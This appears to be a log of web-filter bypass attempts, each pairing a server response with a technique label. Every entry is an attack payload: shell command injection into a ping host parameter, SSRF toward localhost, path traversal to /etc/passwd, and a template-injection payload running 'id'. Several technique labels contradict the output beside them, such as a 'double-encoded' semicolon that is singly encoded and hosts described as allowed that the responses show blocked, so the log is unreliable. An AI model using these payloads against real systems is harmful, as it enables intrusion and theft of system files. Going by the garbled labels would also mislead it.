ping: 127.0.0.1%09id: Name or service not known
technique: URL-encoded TAB (%09) as shell word separator instead of blocked chars

raw_stdout: {"error":"blocked_by_waf","match":"host=127.0.0.1 -c 1 -W 1 && id #","pattern":"[;&|`$()\\\\n]"}
technique: Space-delimited flag injection with comment to terminate; space not in WAF block_patterns

raw_stdout: ping: 127.0.0.1%20%2D%2Dc%201%3B%20id: Name or service not known
technique: Double URL-encoded semicolon — WAF regex may only match raw chars, not %3B

raw_stdout: {"error":"blocked_private_ip","host":"127.0.0.1"}
technique: Use allowed scheme (https) AND allowed host (127.0.0.1) — WAF permits both, reaches internal service

raw_stdout: {"error":"blocked_host","host":"localhost"}
technique: localhost is on ssrf_allowed_hosts; attempt file read via localhost path traversal

raw_stdout: {"error":"blocked_by_waf","match":"name=....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd","pattern":"[;&|`$()\\\\n]"}
technique: Double-dot obfuscation: '....//'' collapses to '../' after naive '..' strip, bypassing substring check

raw_stdout: {"error":"blocked_by_waf","match":"name=%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd","pattern":"[;&|`$()\\\\n]"}
technique: Fully URL-encoded '../../../etc/passwd' — WAF blocks literal '..' string, not encoded form

raw_stdout: {"error":"blocked_by_waf","match":"template={{lipsum.__globals__['os'].popen('id').read()}}","pattern":"[;&|`$()\\\\n]"}
